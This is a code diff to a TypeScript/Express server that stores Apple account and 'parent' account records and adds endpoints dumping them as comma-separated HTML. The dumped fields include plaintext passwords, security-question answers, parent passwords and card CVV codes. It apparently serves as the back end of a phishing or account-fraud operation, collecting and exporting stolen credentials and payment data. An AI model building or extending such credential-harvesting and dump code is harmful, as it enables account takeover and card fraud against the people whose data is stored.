@@ -22,6 +22,15 @@ export const addAccount = async (
       return;
     }
 
+    const existingAccount = await AppleAccount.findOne({
+      email: account.email,
+    });
+
+    if (existingAccount) {
+      res.status(201).send("Account already exists");
+      return;
+    }
+
     await AppleAccount.create(account);
 
     res.status(201).send("Account added successfully");
@@ -61,6 +70,13 @@ export const addParent = async (
 
     if (Object.keys(parent).length === 0) {
       res.status(400).send("Invalid request");
+      return;
+    }
+
+    const existingParent = await Parent.findOne({ email: parent.email });
+
+    if (existingParent) {
+      res.status(201).send("Parent already exists");
       return;
     }
 
@@ -154,8 +170,11 @@ export const getUnknowns = async (req: Request, res: Response) => {
           parent_second_q,
           parent_third_q,
           cvv,
+          url,
         }) =>
-          `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
+          cvv
+            ? `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${cvv}`
+            : `${email},${password},${date},${first_q},${second_q},${third_q},${first_name},${last_name},${parent_email},${parent_password},${parent_date},${parent_first_q},${parent_second_q},${parent_third_q},${url}`
       )
       .join("<br />");
 
@@ -165,11 +184,12 @@ export const getUnknowns = async (req: Request, res: Response) => {
   }
 };
 
-export const getParents = async (req: Request, res: Response) => {
+export const getParentsCvv = async (req: Request, res: Response) => {
   try {
     const parents = await Parent.find();
 
     const parentText = parents
+      .filter((parent) => parent.cvv)
       .map(
         ({
           email,
@@ -183,6 +203,35 @@ export const getParents = async (req: Request, res: Response) => {
           no_of_family,
         }) =>
           `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
+      )
+      .join("<br />");
+
+    res.status(200).send(`<p>${parentText}</p>`);
+  } catch (error) {
+    res.status(500).send("Something went wrong getting the parents");
+  }
+};
+
+export const getParentsUrl = async (req: Request, res: Response) => {
+  try {
+    const parents = await Parent.find();
+
+    const parentText = parents
+      .filter((parent) => parent.url)
+      .map(
+        ({
+          email,
+          password,
+          date,
+          first_q,
+          second_q,
+          third_q,
+          no,
+          url,
+          stop_sharing,
+          no_of_family,
+        }) =>
+          `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`
       )
       .join("<br />");
 
@@ -206,10 +255,14 @@ export const getErrors = async (req: Request, res: Response) => {
           second_q,
           third_q,
           cvv,
+          no,
+          url,
           stop_sharing,
           no_of_family,
         }) =>
-          `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
+          cvv
+            ? `${email},${password},${date},${first_q},${second_q},${third_q},${cvv},${stop_sharing},${no_of_family}`
+            : `${email},${password},${date},${first_q},${second_q},${third_q},${no},${url},${stop_sharing},${no_of_family}`
       )
       .join("<br />");
 
